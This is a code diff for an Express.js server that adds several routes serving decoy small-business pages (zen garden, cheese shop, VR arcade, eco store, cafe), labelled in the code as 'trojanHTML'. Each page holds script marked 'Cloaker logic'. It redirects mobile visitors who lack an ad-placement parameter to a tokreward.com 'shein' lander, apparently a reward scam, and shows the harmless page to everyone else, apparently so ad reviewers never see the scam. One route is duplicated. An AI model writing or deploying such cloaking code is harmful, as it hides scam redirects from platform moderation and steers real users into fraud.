@@ -17,6 +17,696 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ALEXI 5.0
 
 // SHEIN BH FLUENT
+app.get('/94878/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Zen Garden Retreats</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Noto Sans JP', sans-serif;
+                    background-color: #f0f5f1;
+                    color: #2c3e50;
+                }
+                .zen-container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #34495e;
+                    color: #ecf0f1;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .garden-gallery {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 25px;
+                }
+                .garden-item {
+                    background-color: #fff;
+                    border-radius: 10px;
+                    overflow: hidden;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                }
+                .garden-item img {
+                    width: 100%;
+                    height: 200px;
+                    object-fit: cover;
+                }
+                .garden-info {
+                    padding: 15px;
+                }
+                footer {
+                    background-color: #34495e;
+                    color: #ecf0f1;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #3498db;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Zen Garden Retreats</h1>
+                <p>Find peace in nature's embrace</p>
+            </header>
+            <div class="zen-container">
+                <h2>Our Tranquil Spaces</h2>
+                <p>Welcome to ${slug} Zen Garden Retreats, where you can escape the chaos of daily life and find inner harmony.</p>
+                <div class="garden-gallery">
+                    <div class="garden-item">
+                        <img src="https://example.com/rock-garden.jpg" alt="Rock Garden">
+                        <div class="garden-info">
+                            <h3>Minimalist Rock Garden</h3>
+                            <p>Experience the beauty of simplicity in our carefully arranged rock formations.</p>
+                        </div>
+                    </div>
+                    <div class="garden-item">
+                        <img src="https://example.com/koi-pond.jpg" alt="Koi Pond">
+                        <div class="garden-info">
+                            <h3>Serene Koi Pond</h3>
+                            <p>Watch colorful koi fish glide through crystal-clear waters, surrounded by lush greenery.</p>
+                        </div>
+                    </div>
+                    <div class="garden-item">
+                        <img src="https://example.com/bamboo-grove.jpg" alt="Bamboo Grove">
+                        <div class="garden-info">
+                            <h3>Whispering Bamboo Grove</h3>
+                            <p>Lose yourself in the gentle rustling of bamboo leaves as you stroll through our peaceful grove.</p>
+                        </div>
+                    </div>
+                    <div class="garden-item">
+                        <img src="https://example.com/tea-house.jpg" alt="Tea House">
+                        <div class="garden-info">
+                            <h3>Traditional Tea House</h3>
+                            <p>Participate in a authentic tea ceremony and connect with ancient traditions.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Zen Garden Retreats | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/94878/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Zen Garden Retreats</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Noto Sans JP', sans-serif;
+                    background-color: #f0f5f1;
+                    color: #2c3e50;
+                }
+                .zen-container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #34495e;
+                    color: #ecf0f1;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .garden-gallery {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 25px;
+                }
+                .garden-item {
+                    background-color: #fff;
+                    border-radius: 10px;
+                    overflow: hidden;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                }
+                .garden-item img {
+                    width: 100%;
+                    height: 200px;
+                    object-fit: cover;
+                }
+                .garden-info {
+                    padding: 15px;
+                }
+                footer {
+                    background-color: #34495e;
+                    color: #ecf0f1;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #3498db;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Zen Garden Retreats</h1>
+                <p>Find peace in nature's embrace</p>
+            </header>
+            <div class="zen-container">
+                <h2>Our Tranquil Spaces</h2>
+                <p>Welcome to ${slug} Zen Garden Retreats, where you can escape the chaos of daily life and find inner harmony.</p>
+                <div class="garden-gallery">
+                    <div class="garden-item">
+                        <img src="https://example.com/rock-garden.jpg" alt="Rock Garden">
+                        <div class="garden-info">
+                            <h3>Minimalist Rock Garden</h3>
+                            <p>Experience the beauty of simplicity in our carefully arranged rock formations.</p>
+                        </div>
+                    </div>
+                    <div class="garden-item">
+                        <img src="https://example.com/koi-pond.jpg" alt="Koi Pond">
+                        <div class="garden-info">
+                            <h3>Serene Koi Pond</h3>
+                            <p>Watch colorful koi fish glide through crystal-clear waters, surrounded by lush greenery.</p>
+                        </div>
+                    </div>
+                    <div class="garden-item">
+                        <img src="https://example.com/bamboo-grove.jpg" alt="Bamboo Grove">
+                        <div class="garden-info">
+                            <h3>Whispering Bamboo Grove</h3>
+                            <p>Lose yourself in the gentle rustling of bamboo leaves as you stroll through our peaceful grove.</p>
+                        </div>
+                    </div>
+                    <div class="garden-item">
+                        <img src="https://example.com/tea-house.jpg" alt="Tea House">
+                        <div class="garden-info">
+                            <h3>Traditional Tea House</h3>
+                            <p>Participate in a authentic tea ceremony and connect with ancient traditions.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Zen Garden Retreats | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/94877/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Artisan Cheese Emporium</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Merriweather', serif;
+                    background-color: #fdf5e6;
+                    color: #8b4513;
+                }
+                .cheese-container {
+                    max-width: 1100px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #f4a460;
+                    color: #fff;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .cheese-selection {
+                    display: flex;
+                    flex-wrap: wrap;
+                    justify-content: space-around;
+                }
+                .cheese-item {
+                    background-color: #fffaf0;
+                    border: 2px solid #deb887;
+                    border-radius: 10px;
+                    padding: 20px;
+                    margin: 15px;
+                    width: 220px;
+                    text-align: center;
+                }
+                .cheese-item img {
+                    width: 150px;
+                    height: 150px;
+                    border-radius: 50%;
+                    object-fit: cover;
+                    margin-bottom: 10px;
+                }
+                footer {
+                    background-color: #f4a460;
+                    color: #fff;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #fffaf0;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Artisan Cheese Emporium</h1>
+                <p>Discover the world's finest artisanal cheeses</p>
+            </header>
+            <div class="cheese-container">
+                <h2>Our Curated Selection</h2>
+                <p>Welcome to ${slug} Artisan Cheese Emporium, where every cheese tells a story of tradition and craftsmanship.</p>
+                <div class="cheese-selection">
+                    <div class="cheese-item">
+                        <img src="https://example.com/brie.jpg" alt="Brie">
+                        <h3>Creamy Brie</h3>
+                        <p>Soft, buttery cheese with a mild flavor</p>
+                    </div>
+                    <div class="cheese-item">
+                        <img src="https://example.com/cheddar.jpg" alt="Aged Cheddar">
+                        <h3>Aged Cheddar</h3>
+                        <p>Sharp and complex with a crumbly texture</p>
+                    </div>
+                    <div class="cheese-item">
+                        <img src="https://example.com/gouda.jpg" alt="Smoked Gouda">
+                        <h3>Smoked Gouda</h3>
+                        <p>Rich and smoky with a smooth texture</p>
+                    </div>
+                    <div class="cheese-item">
+                        <img src="https://example.com/bleu.jpg" alt="Roquefort">
+                        <h3>Roquefort</h3>
+                        <p>Bold and tangy blue cheese from France</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Artisan Cheese Emporium | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/94778/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Virtual Reality Arcade</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Exo 2', sans-serif;
+                    background-color: #1a1a2e;
+                    color: #e94560;
+                }
+                .vr-container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #16213e;
+                    color: #e94560;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .game-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+                    gap: 25px;
+                }
+                .vr-game {
+                    background-color: #0f3460;
+                    border-radius: 15px;
+                    padding: 20px;
+                    text-align: center;
+                    transition: transform 0.3s ease;
+                }
+                .vr-game:hover {
+                    transform: scale(1.05);
+                }
+                .vr-game img {
+                    max-width: 100%;
+                    border-radius: 10px;
+                    margin-bottom: 15px;
+                }
+                footer {
+                    background-color: #16213e;
+                    color: #e94560;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #53c1de;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Virtual Reality Arcade</h1>
+                <p>Step into new dimensions of gaming</p>
+            </header>
+            <div class="vr-container">
+                <h2>Featured VR Experiences</h2>
+                <p>Welcome to ${slug} VR Arcade, where reality is limited only by your imagination!</p>
+                <div class="game-grid">
+                    <div class="vr-game">
+                        <img src="https://example.com/space-explorer.jpg" alt="Space Explorer VR">
+                        <h3>Space Explorer</h3>
+                        <p>Navigate through asteroid fields and discover alien worlds</p>
+                    </div>
+                    <div class="vr-game">
+                        <img src="https://example.com/zombie-apocalypse.jpg" alt="Zombie Apocalypse VR">
+                        <h3>Zombie Apocalypse</h3>
+                        <p>Survive hordes of undead in this heart-pounding adventure</p>
+                    </div>
+                    <div class="vr-game">
+                        <img src="https://example.com/ocean-depths.jpg" alt="Ocean Depths VR">
+                        <h3>Ocean Depths</h3>
+                        <p>Explore vibrant coral reefs and encounter marine life</p>
+                    </div>
+                    <div class="vr-game">
+                        <img src="https://example.com/medieval-quest.jpg" alt="Medieval Quest VR">
+                        <h3>Medieval Quest</h3>
+                        <p>Embark on an epic journey as a knight in a magical realm</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Virtual Reality Arcade | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/94777/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Eco Wonders</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Roboto', sans-serif;
+                    background-color: #f0f4f0;
+                    color: #2c3e50;
+                }
+                .eco-container {
+                    max-width: 1100px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #27ae60;
+                    color: white;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .product-showcase {
+                    display: flex;
+                    flex-wrap: wrap;
+                    justify-content: space-around;
+                }
+                .eco-product {
+                    background-color: white;
+                    border-radius: 10px;
+                    padding: 20px;
+                    margin: 15px;
+                    width: 250px;
+                    text-align: center;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                }
+                .eco-product img {
+                    max-width: 100%;
+                    height: auto;
+                    border-radius: 5px;
+                }
+                footer {
+                    background-color: #2ecc71;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #ecf0f1;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Eco Wonders</h1>
+                <p>Sustainable living made easy</p>
+            </header>
+            <div class="eco-container">
+                <h2>Our Eco-Friendly Products</h2>
+                <p>Discover amazing sustainable products at ${slug} Eco Wonders. Every purchase contributes to a greener planet!</p>
+                <div class="product-showcase">
+                    <div class="eco-product">
+                        <img src="https://example.com/bamboo-toothbrush.jpg" alt="Bamboo Toothbrush">
+                        <h3>Bamboo Toothbrush</h3>
+                        <p>Biodegradable handle, soft bristles</p>
+                    </div>
+                    <div class="eco-product">
+                        <img src="https://example.com/reusable-water-bottle.jpg" alt="Reusable Water Bottle">
+                        <h3>Stainless Steel Water Bottle</h3>
+                        <p>Durable, BPA-free, keeps drinks cold for 24 hours</p>
+                    </div>
+                    <div class="eco-product">
+                        <img src="https://example.com/beeswax-wraps.jpg" alt="Beeswax Food Wraps">
+                        <h3>Beeswax Food Wraps</h3>
+                        <p>Reusable alternative to plastic wrap</p>
+                    </div>
+                    <div class="eco-product">
+                        <img src="https://example.com/solar-charger.jpg" alt="Solar Phone Charger">
+                        <h3>Solar Phone Charger</h3>
+                        <p>Harness the sun's power for your devices</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Eco Wonders | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/90577/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Cosmic Cafe</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Orbitron', sans-serif;
+                    background-color: #0c0c2c;
+                    color: #e0e0ff;
+                }
+                .space-container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #1a1a4a;
+                    text-align: center;
+                    padding: 2em;
+                    margin-bottom: 30px;
+                }
+                .menu-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 20px;
+                }
+                .menu-item {
+                    background-color: #2d2d7a;
+                    border-radius: 15px;
+                    padding: 20px;
+                    text-align: center;
+                    box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+                }
+                footer {
+                    background-color: #1a1a4a;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 30px;
+                }
+                footer a {
+                    color: #00ffff;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Cosmic Cafe</h1>
+                <p>Out-of-this-world dining experience</p>
+            </header>
+            <div class="space-container">
+                <h2>Intergalactic Menu</h2>
+                <p>Welcome to ${slug} Cosmic Cafe, where every meal is an adventure through the cosmos!</p>
+                <div class="menu-grid">
+                    <div class="menu-item">
+                        <h3>Nebula Noodles</h3>
+                        <p>Swirling pasta infused with bioluminescent sauce</p>
+                    </div>
+                    <div class="menu-item">
+                        <h3>Martian Meatballs</h3>
+                        <p>Plant-based spheres with a red planet kick</p>
+                    </div>
+                    <div class="menu-item">
+                        <h3>Galactic Grilled Cheese</h3>
+                        <p>Oozing with cheese from the Milky Way</p>
+                    </div>
+                    <div class="menu-item">
+                        <h3>Supernova Smoothie</h3>
+                        <p>A blast of fruity flavors from distant galaxies</p>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Cosmic Cafe | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/9057/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=905`;
